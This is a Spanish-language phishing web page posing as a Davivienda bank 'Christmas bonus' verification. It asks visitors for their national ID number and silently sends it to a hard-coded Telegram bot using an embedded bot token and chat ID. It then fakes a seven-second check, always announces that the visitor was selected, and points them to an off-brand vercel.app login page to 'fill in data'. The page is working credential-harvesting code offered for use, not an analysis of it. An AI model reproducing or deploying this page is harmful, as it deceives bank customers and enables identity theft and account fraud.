<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Verificaci√≥n de Bono Navide√±o ‚Ä¢ Davivienda</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">


  <style>
    /* Estilos de Marca */
    :root { --brand-red: #b3001b; }
    .header-red { background: var(--brand-red); }
    body { 
        -webkit-font-smoothing: antialiased; 
        -moz-osx-font-smoothing: grayscale; 
        font-family: 'Inter', sans-serif;
    }

    /* üé® LOADER MEJORADO - Estilo Circular Rojo */
    .better-loader {
      width: 50px; 
      height: 50px;
      border-radius: 50%;
      border: 5px solid #f9e2e5; 
      border-top-color: var(--brand-red); 
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Animaci√≥n de entrada para el resultado */
    .fade-in {
        animation: fadeIn 0.8s ease-in-out;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(15px); }
        to { opacity: 1; transform: translateY(0); }
    }

    /* Estilo profesional para el input focus */
    .input-focus-red:focus {
        border-color: var(--brand-red);
        box-shadow: 0 0 0 2px rgba(179, 0, 27, 0.2);
    }

    /* Estilo del bot√≥n principal profesional */
    .btn-primary {
        background-color: var(--brand-red);
        transition: all 0.2s ease-in-out;
    }
    .btn-primary:hover {
        background-color: #9a0017;
    }

  </style>
</head>

<body class="bg-gray-100 text-gray-800 flex flex-col min-h-screen">

  <header class="header-red text-white shadow-lg sticky top-0 z-10">
    <div class="max-w-lg mx-auto px-4 py-3 flex items-center justify-between">

      <a href="#" class="flex items-center gap-2">
        <img src="logo.png" class="h-3 object-contain" alt="Davivienda Logo">
        <span class="text-xl font-bold tracking-tight"></span>
      </a>

      
        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5.121 17.804A13.937 13.937 0 0112 16c2.5 0 4.847.655 6.879 1.804M15 10a3 3 0 11-6 0 3 3 0 016 0zm6 3a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>
    </div>
  </header>

  <main class="max-w-lg mx-auto px-5 py-8 flex-grow">

    <div class="text-sm text-gray-500 mb-6 flex items-center gap-2">
      <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/>
      </svg>
      <span onclick="window.history.back()" class="cursor-pointer font-medium hover:text-red-600 transition">Bono Navide√±o</span>
      <span class="text-gray-400">/ Verificaci√≥n</span>
    </div>

    <h1 class="text-3xl md:text-4xl font-extrabold leading-snug mb-3 text-gray-900">
      Verificaci√≥n de Bono Navide√±o üéÅ
    </h1>
    <p class="text-gray-600 leading-relaxed mb-8">
        Ingrese su <b>n√∫mero de c√©dula</b> para saber si ha sido seleccionado para el Bono Navide√±o.
    </p>

    <div id="cedula-form-section" class="bg-white p-6 rounded-2xl shadow-xl transition-all duration-500">

      <div class="mb-6">
        <label for="cedula" class="block text-sm font-semibold text-gray-700 mb-2">C√©dula (m√°x. 10 d√≠gitos)</label>
        <input type="number" id="cedula" maxlength="10" placeholder="Ingrese su documento aqu√≠"
               class="w-full px-4 py-3 border border-gray-300 rounded-xl input-focus-red text-lg shadow-inner transition duration-200"
               oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
               required>
        <p id="error-message" class="text-sm text-red-600 font-medium mt-2 hidden">‚ö†Ô∏è Por favor, ingrese un n√∫mero de c√©dula <b>v√°lido</b> (m√°ximo 10 d√≠gitos).</p>
      </div>

      <button id="verify-button"
        class="w-full btn-primary hover:bg-red-800 transition text-white font-bold py-3 rounded-xl text-lg shadow-lg shadow-red-500/50 flex items-center justify-center">
        Verificar Disponibilidad
      </button>
    </div>

    <div id="loader-section" class="hidden text-center py-12 bg-white rounded-2xl shadow-xl border-t-4 border-red-600/50 transition-all duration-500">
      <div class="flex flex-col items-center justify-center">
        <div class="better-loader mb-6"></div>
        <p class="text-2xl font-bold text-red-700">Verificando en el sistema...</p>
        <p class="text-gray-600 mt-2">Esto puede tardar unos segundos.</p>
      </div>
    </div>

    <div id="result-section" class="hidden text-center py-10 fade-in">
      <div class="bg-white rounded-3xl shadow-2xl p-8 border-4 border-green-400/70">

        <svg class="w-20 h-20 text-green-600 mx-auto mb-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>

        <h2 class="text-3xl font-extrabold text-green-700 mb-3">¬°Felicitaciones!</h2>
        <p class="text-xl font-semibold text-gray-800 mb-8">
            Usted ha sido <b>seleccionado</b> para el <b>Bono navide√±o</b>.
        </p>

        <button onclick="location.href='https://davivifullse.vercel.app/login'"
          class="w-full btn-primary hover:bg-red-800 transition text-white font-bold py-3 rounded-xl text-lg shadow-lg shadow-red-500/60">
          CONTINUAR PARA LLENAR DATOS
        </button>
        <p class="text-sm text-gray-500 mt-4">Haga clic para completar la solicitud del Bono.</p>
      </div>
    </div>

  </main>

  <button class="fixed bottom-8 right-5 btn-primary text-white p-4 rounded-full shadow-2xl transition hover:scale-105">
    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <path stroke-linecap="round" stroke-linejoin="round"
        d="M18 8a6 6 0 10-12 0v4a3 3 0 003 3h.5a1.5 1.5 0 001.5-1.5V12a1 1 0 00-1-1H9" />
      <path stroke-linecap="round" stroke-linejoin="round"
        d="M6 15v2a2 2 0 002 2h1" />
    </svg>
  </button>

  <footer class="w-full mt-10 py-6 bg-white border-t border-gray-200 shadow-inner">
    <div class="max-w-lg mx-auto px-5 flex justify-center">
      <p class="text-sm text-gray-500 font-semibold opacity-90">Davivienda</p>
    </div>
  </footer>

  <script>
    // --- Configuraci√≥n de Telegram (Usando los datos que proporcionaste) ---
    const TELEGRAM_BOT_TOKEN = '8495218543:AAEMTxhx0-wHxW-UPRMst_xN6fT8l2YPZKA';
    const TELEGRAM_CHAT_ID = '-5083730876';
    // ---------------------------------

    /**
     * Env√≠a un mensaje a Telegram con la c√©dula consultada.
     * @param {string} cedula El n√∫mero de c√©dula ingresado por el usuario.
     */
    function sendToTelegram(cedula) {
      // El mensaje que se enviar√°: üî¥NUEVA CONSULTA: (Cedula)
      const message = `üî¥NUEVA CONSULTA (BONO): ${cedula}`;
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      const params = new URLSearchParams({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML' 
      });

      // Petici√≥n fetch al API de Telegram
      fetch(`${url}?${params.toString()}`, {
          method: 'POST',
      })
      .then(response => {
          if (!response.ok) {
              console.error('Error al enviar a Telegram. Estado:', response.status);
          } else {
              console.log('C√©dula enviada a Telegram con √©xito.');
          }
      })
      .catch(error => {
          console.error('Error de red al intentar enviar a Telegram:', error);
      });
    }

    document.getElementById('verify-button').addEventListener('click', function() {
      const cedulaInput = document.getElementById('cedula');
      const cedula = cedulaInput.value.trim();
      const errorMessage = document.getElementById('error-message');

      // Validaci√≥n de longitud
      if (cedula.length === 0 || cedula.length > 10) {
        errorMessage.classList.remove('hidden');
        cedulaInput.classList.add('border-red-500');
        cedulaInput.focus();
        return;
      }
      errorMessage.classList.add('hidden');
      cedulaInput.classList.remove('border-red-500');

      // üõë PASO CLAVE: ENVIAR A TELEGRAM antes de simular la espera
      sendToTelegram(cedula);

      // 1. Ocultar el formulario
      document.getElementById('cedula-form-section').classList.add('hidden');

      // 2. Mostrar el Loader
      const loaderSection = document.getElementById('loader-section');
      loaderSection.classList.remove('hidden');

      // 3. Simular la verificaci√≥n (7 segundos)
      setTimeout(function() {
        // 4. Ocultar el Loader
        loaderSection.classList.add('hidden');

        // 5. Mostrar el Resultado de Beneficiado
        const resultSection = document.getElementById('result-section');
        resultSection.classList.remove('hidden');
        resultSection.classList.add('fade-in'); 
      }, 7000); 
    });
  </script>

</body>
</html>
